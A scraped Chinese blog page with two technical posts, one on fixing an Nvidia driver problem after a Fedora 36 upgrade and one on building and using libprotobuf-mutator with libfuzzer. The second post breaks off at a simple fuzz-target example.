    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/05/16/Fedora36-Nvidia/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/16/Fedora36-Nvidia/" class="post-title-link" itemprop="url">升级 Fedora 36，遇上 Nvidia 驱动问题</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-16 16:58:37" itemprop="dateCreated datePublished" datetime="2022-05-16T16:58:37+08:00">2022-05-16</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>Fedora 36 正式版已经释出一段时间了，根据我的经验开始的一周都会有 bug，一般等一段时间再升级会更平滑一些。然而，老革命又遇上了新问题，显示出问题了启动不起来。我已经很久没有遇上显示驱动问题了，我在很久以前就禁用了开源驱动 <code>nouveau</code>，一直都用得很好。</p>
<p>修改 &#x2F;etc&#x2F;default&#x2F;grub 文件，在 <code>GRUB_CMDLINE_LINUX</code> 添加下面参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRUB_CMDLINE_LINUX=&quot;... rd.driver.blacklist=nouveau modprobe.blacklist=nouveau nvidia-drm.modeset=1&quot;</span><br></pre></td></tr></table></figure>

<p>重新生成 grub 文件， <code>sudo grub2-mkconfig -o /boot/grub2/grub.cfg</code>，但是在升级 Fedora 36 后似乎没有起作用。诡异的是 Fedora 35 的内核却可以正常工作，首先怀疑的是 nvidia 驱动可能没有安装对。执行下面命令行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf reinstall xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>

<p>可惜没有解决问题，上网找资料看看 Fedora 36 有没什么特殊的地方。安装 Nvidia 驱动网上有这篇文章说的详细<br><a target="_blank" rel="noopener" href="https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/">https://www.linuxcapable.com/how-to-install-nvidia-drivers-on-fedora-36-linux/</a><br>仔细拜读了一下，还是没有发现啥问题，驱动也重新安装了啊，开始怀疑是新版 Nvidia 驱动的问题</p>
<p><code>sudo dnf search xorg-x11-drv-nvidia</code> 可以查看所有的驱动，<code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> <code>xorg-x11-drv-nvidia-340xx</code> 不知道到底需要安装哪个版本的驱动。😭</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">xorg-x11-drv-nvidia.x86_64 : NVIDIA&#x27;s proprietary display driver for NVIDIA graphic cards</span><br><span class="line">=========================================================================== 名称 和 概况 匹配：xorg-x11-drv-nvidia</span><br><span class="line">xorg-x11-drv-nvidia-340xx-cuda.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-devel.i686 : Development files for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-340xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-340xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-340xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-340xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-devel.i686 : Development files for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-390xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-390xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-390xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-390xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda.x86_64 : CUDA driver for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda-libs.i686 : CUDA libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-cuda-libs.x86_64 : CUDA libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-devel.i686 : Development files for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-devel.x86_64 : Development files for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-kmodsrc.x86_64 : xorg-x11-drv-nvidia-470xx kernel module source code</span><br><span class="line">xorg-x11-drv-nvidia-470xx-libs.i686 : Libraries for xorg-x11-drv-nvidia-470xx</span><br><span class="line">xorg-x11-drv-nvidia-470xx-libs.x86_64 : Libraries for xorg-x11-drv-nvidia-470xx</span><br></pre></td></tr></table></figure>

<p>可是仔细一琢磨， Fedora 35 Nvidia 驱动不是工作正常吗，可以上去看看用的是哪个版本的驱动，执行命令 <code>nvidia-settings</code>,在 System Information 中发现使用的就是最新版本的驱动 <strong>510.68.02</strong>，看样子最新版本的驱动也没有问题，一下陷入了困境。😰</p>
<p>没啥好办法，还是 Google 搜索一下，结果发现了一个链接在讨论这个问题，和我遇上的现象一样，作者最终解决了问题<br><a target="_blank" rel="noopener" href="https://ask.fedoraproject.org/t/fedora-linux-kernel-update-breaks-nvidia-driver/21954/11">Fedora Linux kernel update breaks NVIDIA driver</a></p>
<p>原来是旧版的驱动没有卸载干净，参考 <a target="_blank" rel="noopener" href="https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver">https://rpmfusion.org/Howto/NVIDIA#Uninstall_the_NVIDIA_driver</a><br>驱动卸载 Nvidia 驱动需要使用命令 <code>dnf remove xorg-x11-drv-nvidia\*</code></p>
<p>按照下面的命令操作了一遍，重启系统，熟悉的登录界面终于又出现了。😄</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dnf remove xorg-x11-drv-nouveau</span><br><span class="line">sudo dnf remove xorg-x11-drv-nvidia\*</span><br><span class="line">sudo dnf install xorg-x11-drv-nvidia akmod-nvidia kmod-nvidia.x86_64</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/05/11/libprotobuf-mutator/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="安全代码">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | 安全代码">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/05/11/libprotobuf-mutator/" class="post-title-link" itemprop="url">libprotobuf-mutator 简单分析</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-05-11 15:26:12" itemprop="dateCreated datePublished" datetime="2022-05-11T15:26:12+08:00">2022-05-11</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="What-are-protocol-buffers"><a href="#What-are-protocol-buffers" class="headerlink" title="What are protocol buffers?"></a><a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/overview">What are protocol buffers?</a></h2><p>Protocol buffers are Google’s language-neutral, platform-neutral, extensible mechanism for serializing structured data – think XML, but smaller, faster, and simpler. You define how you want your data to be structured once, then you can use special generated source code to easily write and read your structured data to and from a variety of data streams and using a variety of languages.</p>
<p>这段是 Google 官方网站给出的介绍，protobuf 可以自动化生成代码，用于读入或者写入结构化数据。一个简单的 protobuf 文件可以是这样的：</p>
<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">message </span><span class="title class_">Person</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">string</span> name = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">int32</span> id = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">optional</span> <span class="type">string</span> email = <span class="number">3</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>具体的语法可以参考Google 的文档 <a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/proto">proto2</a> 和 <a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/proto3">proto3</a>。c++ 语言使用 protobuf 的示例可以参见<a target="_blank" rel="noopener" href="https://developers.google.com/protocol-buffers/docs/cpptutorial">Protocol Buffer Basics: C++</a> 文档，基本步骤总结如下：</p>
<ol>
<li>写 protobuf 文件，表达数据结构</li>
<li>利用 protoc 自动生成代码 （支持多种语言 C++ Java 等）</li>
<li>利用生成的文件解析或者写入相关数据结构</li>
</ol>
<h2 id="libprotobuf-mutator"><a href="#libprotobuf-mutator" class="headerlink" title="libprotobuf-mutator"></a>libprotobuf-mutator</h2><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>参考： <a target="_blank" rel="noopener" href="https://github.com/google/libprotobuf-mutator/blob/master/README.md">https://github.com/google/libprotobuf-mutator/blob/master/README.md</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/google/libprotobuf-mutator.git</span><br><span class="line"><span class="built_in">mkdir</span> build</span><br><span class="line"><span class="built_in">cd</span> build</span><br><span class="line">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug</span><br><span class="line">https_proxy=http://127.0.0.1:3128 ninja check</span><br></pre></td></tr></table></figure>

<p>由于需要从Google下载一些源码，所以在 <code>ninja check</code> 的时候需要挂上代理，结果编译出错了，找不到 <code>libxml2.a</code>，排查一下编译参数，发现需要添加编译静态库的参数</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/cmake/external/libxml2.cmake b/cmake/external/libxml2.cmake</span></span><br><span class="line"><span class="comment">index c00ace2..a944fab 100644</span></span><br><span class="line"><span class="comment">--- a/cmake/external/libxml2.cmake</span></span><br><span class="line"><span class="comment">+++ b/cmake/external/libxml2.cmake</span></span><br><span class="line"><span class="meta">@@ -38,6 +38,7 @@</span> ExternalProject_Add($&#123;LIBXML2_TARGET&#125;</span><br><span class="line">     UPDATE_COMMAND &quot;&quot;</span><br><span class="line">     CONFIGURE_COMMAND $&#123;LIBXML2_SRC_DIR&#125;/autogen.sh --without-python</span><br><span class="line">                                                     --prefix=$&#123;LIBXML2_INSTALL_DIR&#125;</span><br><span class="line"><span class="addition">+                                                    --enable-static=yes</span></span><br><span class="line">                                                     CC=$&#123;CMAKE_C_COMPILER&#125;</span><br><span class="line">                                                     CXX=$&#123;CMAKE_CXX_COMPILER&#125;</span><br><span class="line">                                                     CFLAGS=$&#123;LIBXML2_CFLAGS&#125;</span><br></pre></td></tr></table></figure>

<p>修改后可以正常通过 <code>ninja check</code> 命令的所有检查。默认情况下 <code>ninja install</code> 会安装到 &#x2F;usr&#x2F;local 目录，因为考虑到后续需要给 <code>afl+</code>使用，所以需要使用下的命令重新 cmake 一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \</span><br><span class="line">-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator -DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug</span><br></pre></td></tr></table></figure>
<h3 id="libprotobuf-mutator-代码实现"><a href="#libprotobuf-mutator-代码实现" class="headerlink" title="libprotobuf-mutator 代码实现"></a>libprotobuf-mutator 代码实现</h3><p>libfuzzer_macro.h</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, Proto)                 \</span></span><br><span class="line"><span class="meta">  extern <span class="string">&quot;C&quot;</span> int LLVMFuzzerTestOneInput(const uint8_t* data, size_t size) &#123; \</span></span><br><span class="line"><span class="meta">    using protobuf_mutator::libfuzzer::LoadProtoInput;                      \</span></span><br><span class="line"><span class="meta">    Proto input;                                                            \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (LoadProtoInput(use_binary, data, size, &amp;input))                     \</span></span><br><span class="line"><span class="meta">      TestOneProtoInput(input);                                             \</span></span><br><span class="line"><span class="meta">    return 0;                                                               \</span></span><br><span class="line"><span class="meta">  &#125;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// Defines custom mutator, crossover and test functions using default</span></span><br><span class="line"><span class="comment">// serialization format. Default is text.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_PROTO_FUZZER(arg) DEFINE_TEXT_PROTO_FUZZER(arg)</span></span><br><span class="line"><span class="comment">// Defines custom mutator, crossover and test functions using text</span></span><br><span class="line"><span class="comment">// serialization. This format is more convenient to read.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_TEXT_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(false, arg)</span></span><br><span class="line"><span class="comment">// Defines custom mutator, crossover and test functions using binary</span></span><br><span class="line"><span class="comment">// serialization. This makes mutations faster. However often test function is</span></span><br><span class="line"><span class="comment">// significantly slower than mutator, so fuzzing rate may stay unchanged.</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_BINARY_PROTO_FUZZER(arg) DEFINE_PROTO_FUZZER_IMPL(true, arg)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFINE_PROTO_FUZZER_IMPL(use_binary, arg)                              \</span></span><br><span class="line"><span class="meta">  static void TestOneProtoInput(arg);                                          \</span></span><br><span class="line"><span class="meta">  using FuzzerProtoType = std::remove_const&lt;std::remove_reference&lt;             \</span></span><br><span class="line"><span class="meta">      std::function<span class="string">&lt;decltype(TestOneProtoInput)&gt;</span>::argument_type&gt;::type&gt;::type; \</span></span><br><span class="line"><span class="meta">  DEFINE_CUSTOM_PROTO_MUTATOR_IMPL(use_binary, FuzzerProtoType)                \</span></span><br><span class="line"><span class="meta">  DEFINE_CUSTOM_PROTO_CROSSOVER_IMPL(use_binary, FuzzerProtoType)              \</span></span><br><span class="line"><span class="meta">  DEFINE_TEST_ONE_PROTO_INPUT_IMPL(use_binary, FuzzerProtoType)                \</span></span><br><span class="line"><span class="meta">  DEFINE_POST_PROCESS_PROTO_MUTATION_IMPL(FuzzerProtoType)                     \</span></span><br><span class="line"><span class="meta">  static void TestOneProtoInput(arg)</span></span><br></pre></td></tr></table></figure>

<p>调用路径为 <code>DEFINE_PROTO_FUZZER</code> -&gt; <code>DEFINE_TEXT_PROTO_FUZZER</code> -&gt; <code>DEFINE_PROTO_FUZZER_IMPL</code> -&gt; <code>DEFINE_TEST_ONE_PROTO_INPUT_IMPL</code> -&gt; <code>LLVMFuzzerTestOneInput</code> -&gt; <code>TestOneProtoInput</code>。<br>最终还是实现了<code>LLVMFuzzerTestOneInput</code> libfuzzer 的入口方法，使用 macro 可以少写不少代码非常方便，从这里就可以看出 fuzz 的 target function 必须和 <code>LLVMFuzzerTestOneInput</code> 的参数类型一致</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fuzz_target.cc</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">int</span> <span class="title function_">LLVMFuzzerTestOneInput</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *Data, <span class="type">size_t</span> Size)</span> &#123;</span><br><span class="line">  DoSomethingInterestingWithMyAPI(Data, Size);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;  <span class="comment">// Non-zero return values are reserved for future use.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>libfuzzer_macro.cc</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">LoadProtoInput</span><span class="params">(<span class="type">bool</span> binary, <span class="type">const</span> <span class="type">uint8_t</span>* data, <span class="type">size_t</span> size,</span></span></span><br><span class="line"><span class="params"><span class="function">                    protobuf::Message* input)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">GetCache</span>()-&gt;<span class="built_in">LoadIfSame</span>(data, size, input)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">auto</span> result = binary ? <span class="built_in">ParseBinaryMessage</span>(data, size, input)</span><br><span class="line">                       : <span class="built_in">ParseTextMessage</span>(data, size, input);</span><br><span class="line">  <span class="keyword">if</span> (!result) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="built_in">GetMutator</span>()-&gt;<span class="built_in">Seed</span>(size);</span><br><span class="line">  <span class="built_in">GetMutator</span>()-&gt;<span class="built_in">Fix</span>(input);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>LoadProtoInput</code> 返回 <code>true</code> 或者 <code>false</code>，如果解析成功，将调用 <code>TestOneProtoInput</code>，<code>DEFINE_PROTO_FUZZER</code> macro 其实就是写 TestOneProtoInput 的实现。</p>
<h2 id="libprotobuf-mutator-fuzzing-learning"><a href="#libprotobuf-mutator-fuzzing-learning" class="headerlink" title="libprotobuf-mutator_fuzzing_learning"></a>libprotobuf-mutator_fuzzing_learning</h2><p>这是 github 上一位同行写的学习 libprotobuf-mutator fuzzing 的文章，总体写的不错，但是其中有一些错误的地方，在实践过程中都记录了其中的修改。</p>
<h3 id="Simple-protobuf-example"><a href="#Simple-protobuf-example" class="headerlink" title="Simple protobuf example"></a>Simple protobuf example</h3><p>文章：<a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/1_simple_protobuf</a></p>
<p>先写一个简单的 protobuf 文件，test.proto</p>
<figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">TEST</span> &#123;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">uint32</span> a = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">required</span> <span class="type">string</span> b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用 <code>protoc</code> 编译 protobuf 文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> genfiles  </span><br><span class="line">protoc ./test.proto --cpp_out=./genfiles</span><br></pre></td></tr></table></figure>

<p>将自动生成两个文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> ./genfiles</span><br><span class="line">test.pb.cc  test.pb.h</span><br></pre></td></tr></table></figure>

<p>写一个测试程序 test_proto.cc</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;test.pb.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> std::cin;</span><br><span class="line"><span class="keyword">using</span> std::cout;</span><br><span class="line"><span class="keyword">using</span> std::endl;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    TEST t;</span><br><span class="line">    t.<span class="built_in">set_a</span>(<span class="number">101</span>);</span><br><span class="line">    t.<span class="built_in">set_b</span>(<span class="string">&quot;testtest&quot;</span>);</span><br><span class="line">    cout &lt;&lt; t.<span class="built_in">a</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; t.<span class="built_in">b</span>() &lt;&lt; endl;   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>写 Makefile 来编译 <code>test_proto.cc</code></p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CXX=clang++</span><br><span class="line">PB_SRC=test.pb.cc</span><br><span class="line"></span><br><span class="line">PROTOBUF_DIR=<span class="variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/</span><br><span class="line">PROTOBUF_LIB=<span class="variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a</span><br><span class="line">INC=-I<span class="variable">$(PROTOBUF_DIR)</span>/<span class="keyword">include</span></span><br><span class="line"></span><br><span class="line"><span class="section">test_proto: test_proto.cc <span class="variable">$(PB_SRC)</span></span></span><br><span class="line">	<span class="variable">$(CXX)</span> -o <span class="variable">$@</span> <span class="variable">$^</span> <span class="variable">$(PROTOBUF_LIB)</span> <span class="variable">$(INC)</span></span><br><span class="line"></span><br><span class="line"><span class="meta"><span class="keyword">.PHONY</span>: clean</span></span><br><span class="line"><span class="section">clean: </span></span><br><span class="line">	rm test_proto</span><br></pre></td></tr></table></figure>

<p>执行 <code>make</code> 后报错 .&#x2F;test.pb.h:17:2: error: This file was generated by an older version of protoc which is，因为我们在编译的时候使用了 <code>-DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON</code> 下载了新版本的 protobuf，所以出了这个错误。只好使用下载的 protoc 重新生成 <code>test.pb.cc</code> 和 <code>test.pb.h</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/code/libprotobuf-mutator/build/external.protobuf/bin/protoc ./test.proto --cpp_out=./genfiles</span><br></pre></td></tr></table></figure>

<p>这次可以成功 make 了，实际执行的命令是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang++ -o test_proto test_proto.cc test.pb.cc /home/henices/code/libprotobuf-mutator/build/external.protobuf//lib/libprotobufd.a \</span><br><span class="line"> -I/home/henices/code/libprotobuf-mutator/build/external.protobuf//include</span><br></pre></td></tr></table></figure>

<p>运行 <code>./test_proto</code>, 输出如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">101</span><br><span class="line">testtest</span><br></pre></td></tr></table></figure>

<h3 id="Combine-libprotobuf-mutator-with-libfuzzer"><a href="#Combine-libprotobuf-mutator-with-libfuzzer" class="headerlink" title="Combine libprotobuf-mutator with libfuzzer"></a>Combine libprotobuf-mutator with libfuzzer</h3><p>代码在： <a target="_blank" rel="noopener" href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/2_libprotobuf_libfuzzer</a></p>
<p>harness.cc</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="type">int</span> <span class="title">FuzzTEST</span><span class="params">(<span class="type">const</span> <span class="type">uint8_t</span> *data, <span class="type">size_t</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(data[<span class="number">0</span>] == <span class="string">&#x27;\x01&#x27;</span>) &#123;</span><br><span class="line">        __builtin_trap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中 FuzzTEST 是我们需要测试的目标函数。</p>
